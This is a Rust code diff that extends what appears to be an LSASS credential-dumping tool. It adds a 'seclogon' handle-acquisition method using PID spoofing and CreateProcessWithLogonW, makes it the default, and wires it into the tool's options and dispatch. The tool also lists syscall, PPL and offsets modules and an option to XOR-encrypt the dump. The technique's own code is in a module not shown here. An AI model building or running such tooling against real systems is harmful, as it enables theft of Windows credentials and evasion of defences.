@@ -11,6 +11,7 @@ mod minidump;
 mod offsets;
 mod ppl;
 mod resolver;
+mod seclogon;
 mod syscall;
 
 use clap::{Parser, ValueEnum};
@@ -24,6 +25,8 @@ enum HandleMethod {
     Fork,
     /// Duplicate existing LSASS handle from another process
     Dup,
+    /// Seclogon handle leak via PID spoofing + CreateProcessWithLogonW
+    Seclogon,
 }
 
 #[derive(Parser)]
@@ -43,7 +46,7 @@ struct Cli {
     service_name: String,
 
     /// LSASS handle acquisition method
-    #[arg(short, long, value_enum, default_value_t = HandleMethod::Direct)]
+    #[arg(short, long, value_enum, default_value_t = HandleMethod::Seclogon)]
     method: HandleMethod,
 
     /// XOR encrypt the dump file
@@ -71,6 +74,7 @@ fn main() {
             HandleMethod::Direct => "direct (NtOpenProcess)",
             HandleMethod::Fork => "fork (process clone)",
             HandleMethod::Dup => "dup (handle duplication)",
+            HandleMethod::Seclogon => "seclogon (handle leak)",
         }
     );
     println!();
@@ -198,12 +202,14 @@ fn main() {
             HandleMethod::Direct => "direct",
             HandleMethod::Fork => "fork",
             HandleMethod::Dup => "dup",
+            HandleMethod::Seclogon => "seclogon",
         }
     );
     let lsass_handle = match &cli.method {
         HandleMethod::Direct => handle::open_lsass_direct(lsass_pid),
         HandleMethod::Fork => handle::open_lsass_fork(lsass_pid),
         HandleMethod::Dup => handle::open_lsass_dup(lsass_pid),
+        HandleMethod::Seclogon => seclogon::open_lsass_seclogon(&api, lsass_pid),
     };
     let lsass_handle = match lsass_handle {
         Ok(h) => {
